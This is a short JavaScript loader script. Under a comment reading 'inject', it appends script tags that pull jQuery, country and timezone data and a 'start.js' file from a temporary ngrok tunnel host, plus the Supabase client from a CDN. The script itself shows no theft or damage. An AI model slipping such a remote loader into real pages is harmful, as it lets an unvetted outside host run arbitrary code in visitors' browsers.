// init

function l(u, i) {
    var d = document;
    if (!d.getElementById(i)) {
        var s = d.createElement('script');
        s.src = u;
        s.id = i;
        d.body.appendChild(s);
    }
}

document.currentScript.get = function(variable) {
    if(variable=(new RegExp('[?&]'+encodeURIComponent(variable)+'=([^&]*)')).exec(this.src))
    return decodeURIComponent(variable[1]);
};

// inject
var base = "//303d-79-169-178-176.eu.ngrok.io";

l(base+'/shared/jquery.min.js', 'tjq');
l(base+'/shared/Countries.js', 'crt');
l(base+'/shared/Timezones.js', 'tmz');
l('//cdn.jsdelivr.net/npm/@supabase/supabase-js', 'supabase');
setTimeout(()=>{l(base+'/shared/start.js', 'start');}, 10);
